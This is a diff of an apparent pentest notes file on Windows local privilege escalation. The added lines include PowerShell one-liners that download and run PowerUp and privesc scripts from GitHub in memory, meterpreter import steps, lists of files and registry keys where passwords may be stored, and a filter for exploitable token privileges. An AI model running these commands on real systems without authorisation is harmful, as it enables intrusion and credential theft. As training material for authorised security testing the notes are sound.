@@ -1,5 +1,14 @@
 # Windows - Local Privilege Escalation
 
+The following note assumes that a low privilege shell could be obtained on the
+target.
+
+To leverage a shell from a Remote Code Execution (RCE) vulnerability please
+refer to the `[General] Shells` note.
+
+“The more you look, the more you see.”  
+― Pirsig, Robert M., Zen and the Art of Motorcycle Maintenance
+
 ### Enumeration
 
 ###### Basic enumeration
@@ -27,41 +36,55 @@ current system:
 
 ###### Enumeration scripts
 
-Part of the enumeration process detailed below can be automated using scripts.
+Most of the enumeration process detailed below can be automated using scripts.
 
-*Personal preference: `PowerSploit`'s `PowerUp` `Invoke-PrivescAudit` /
-`Invoke-AllChecks` (requires PowerShell) & off-target `Windows Exploit Suggester`*
+To upload the scripts on the target, please refer to the [General] File transfer
+note. Note that PowerShell scripts can be injected directly into memory.
 
-The PowerShell `PowerSploit`'s `PowerUp` `Invoke-PrivescAudit` /
-`Invoke-AllChecks` runs a number of configuration checks:
+*Personal preference: PowerSploit's `PowerUp.ps1` `Invoke-PrivescAudit` /
+`Invoke-AllChecks` + enjoiz's `privesc.bat` or `privesc.ps1` + off-target
+`windows-exploit-suggester`*
+
+The **PowerSploit's PowerUp** `Invoke-PrivescAudit` / `Invoke-AllChecks` and
+enjoiz's `privesc.bat` or `privesc.ps1`scripts run a number of configuration
+checks:
+  - Clear text passwords in files or registry  
   - Unquoted services path
   - Weak services permissions
   - "AlwaysInstallElevated" policy
+  - Token privileges
   - ...
 
-The PowerShell `PowerSploit`'s `PowerUp` can be loaded directly in memory
-using PowerShell `DownloadString` or through a `meterpreter` session:
+The PowerShell scripts can be loaded directly in memory using PowerShell
+`DownloadString` or through a `meterpreter` session:
 
 ```
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/Pow
 erSploit/master/Privesc/PowerUp.ps1’); Invoke-AllChecks”
+powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1’); Invoke-Privesc”
 
 PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
 erSploit/master/Privesc/PowerUp.ps1")
 PS> Invoke-AllChecks
+PS> IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1’)
+PS> Invoke-Privesc
 
 meterpreter> load powershell
 meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
 meterpreter> powershell_execute Invoke-AllChecks
+meterpreter> powershell_import <PRIVESC_PS1_FILE_PATH>
+meterpreter> powershell_execute Invoke-Privesc
 ```
 
-Refer to the "Unpatched system - Exploits detection tools" paragraphe below for
-a detailed usage guide of `Windows Exploit Suggester`.  
+The **windows-exploit-suggester** script compares a targets patch levels against
+the Microsoft vulnerability database in order to detect potential missing
+patches on the target. Refer to the "Unpatched system" section below for a
+detailed usage guide of the script.  
 
 ### Physical access privileges escalation
 
-Physical access open up different ways to bypass user login screen and
-obtain SYSTEM access.
+Physical access open up different ways to bypass user login screen and obtain
+NT AUTHORITY\SYSTEM access.
 
 ###### Hardened system
 
@@ -77,7 +100,8 @@ listed on the following resource
 http://www.uktsupport.co.uk/reference/biosp.htm
 
 Ultimately, BIOS settings can be reseted by removing the CMOS battery or using
-the motherboard Jumper.
+the motherboard Jumper. The system hard drive can also be plugged on another
+computer to extract the SAM base or carry out the process below.  
 
 *Encrypted disk*
 
@@ -174,11 +198,25 @@ The following files, if present on the system, may contain clear text or base64
 encoded passwords and should be reviewed:
 
 ```
-c:\sysprep.inf
-c:\sysprep\sysprep.xml
-c:\unattend.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 %WINDIR%\Panther\Unattended.xml
+%SystemDrive%\sysprep.inf
+%SystemDrive%\sysprep\sysprep.xml
+%WINDIR%\system32\sysprep\Unattend.xml
+%WINDIR%\system32\sysprep\Panther\Unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+%WINDIR%\Panther\Unattend\Unattend.xml
+%WINDIR%\Panther\Unattend.xml
+%SystemDrive%\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT
+%WINDIR%\panther\setupinfo
+%WINDIR%\panther\setupinfo.bak
+%SystemDrive%\unattend.xml
+%WINDIR%\system32\sysprep.inf
+%WINDIR%\system32\sysprep\sysprep.xml
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+%SystemDrive%\inetpub\wwwroot\web.config
+%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml
 
 dir c:\*vnc.ini /s /b
 dir c:\*ultravnc.ini /s /b
@@ -193,11 +231,11 @@ Passwords may also be stored in registry:
 
 ```
 # runas
-
 rundll32.exe keymgr.dll,KRShowKeyMgr
 
 # VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
 # Windows autologin
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -252,9 +290,9 @@ Automatically compare the system patch level to public known exploits:
 
 *Windows Exploit Suggester*
 
-The `windows-exploit-suggester` tool compares a targets patch levels against the
-Microsoft vulnerability database in order to detect potential missing patches
-on the target.  
+The `windows-exploit-suggester` script compares a targets patch levels against
+the Microsoft vulnerability database in order to detect potential missing
+patches on the target.  
 It also notifies the user if there are public exploits and `Metasploit` modules
 available for the missing bulletins.  
 It requires the `systeminfo` command output from a Windows host in order to
@@ -533,7 +571,7 @@ If activated, this mechanism can be leveraged to elevate privileges on the
 system by executing code through the MSI during the installation process as
 NT AUTHORITY\SYSTEM.    
 
-The Windows builtin `req query` and the the `Powershell` `PowerUp` script can
+The Windows built-in `req query` and the the `Powershell` `PowerUp` script can
 be used to check whether the `AlwaysInstallElevated` policy is deployed on the
 host be querying the registry:
 
@@ -591,6 +629,8 @@ Use the following command to retrieve the current user account token privileges:
 
 ```
 whoami /priv
+
+whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivilege" /C:"SeTcbPrivilege" /C:"SeBackupPrivilege" /C:"SeRestorePrivilege" /C:"SeCreateTokenPrivilege" /C:"SeLoadDriverPrivilege" /C:"SeTakeOwnershipPrivilege" /C:"SeDebugPrivilege"
 ```
 
 The following tokens can be exploited to gain SYSTEM access privileges:
@@ -686,9 +726,11 @@ psexec.exe -accepteula -s -i -d cmd.exe
 If a `meterpreter` shell is being used, the `getsystem` command can be
 leveraged to the same end.
 
+### Scheduled tasks
+
 ### TODO
 
-###### Process, services, installed programs and scheduled tasks
+###### Process and installed programs
 
 The following commands can be used to retrieve the process, services,
 installed programs and scheduled tasks of the host:
